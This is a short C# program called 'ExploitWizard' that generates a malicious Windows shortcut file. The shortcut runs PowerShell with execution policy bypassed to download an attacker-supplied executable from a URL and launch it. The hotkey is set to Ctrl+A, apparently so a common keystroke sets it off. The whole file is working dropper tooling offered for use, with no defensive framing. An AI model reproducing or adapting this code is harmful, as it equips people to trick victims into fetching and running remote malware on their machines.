using System;
using Microsoft.Win32;
using IWshRuntimeLibrary;

namespace ExploitWizard
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("");
            Console.WriteLine("Enter The Direct URL For The https:\\\\payload.exe: ");
            string lnk = Console.ReadLine();

            Console.WriteLine("");
            Console.WriteLine("Enter The Desired Name For The Dropped Payload: ");
            string flnm = Console.ReadLine() + ".exe";

            Console.WriteLine("");
            Console.WriteLine("Enter The Desired Name For The Exploit Shortcut File: ");
            string exp = Console.ReadLine() + ".lnk";

            string target = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            string arguments = " -NoProfile -ExecutionPolicy Bypass -command `Invoke-WebRequest -Uri " + lnk + " -OutFile " + flnm + ";Start-Process " + flnm;

            IWshRuntimeLibrary.WshShell wshShell = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcutFile = (IWshRuntimeLibrary.IWshShortcut)wshShell.CreateShortcut(exp);
            shortcutFile.TargetPath = target;
            shortcutFile.Arguments = arguments;
            shortcutFile.Hotkey = "Ctrl+A";
            shortcutFile.Save();
        }
    }
}
